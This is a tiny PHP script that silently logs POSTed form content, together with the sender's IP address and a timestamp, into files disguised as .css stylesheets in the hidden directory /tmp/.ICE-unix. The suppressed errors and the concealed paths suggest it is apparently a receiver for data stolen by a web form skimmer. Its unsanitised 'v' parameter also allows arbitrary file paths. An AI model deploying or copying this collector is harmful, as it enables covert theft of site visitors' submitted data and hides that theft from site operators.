<?php
error_reporting(0);
if(isset($_POST['content']) && isset($_POST['v']))
	file_put_contents("/tmp/.ICE-unix/forms{$_POST['v']}.css", "{$_SERVER['REMOTE_ADDR']}\t".time()."\t{$_POST['content']}\r\n",FILE_APPEND);
?>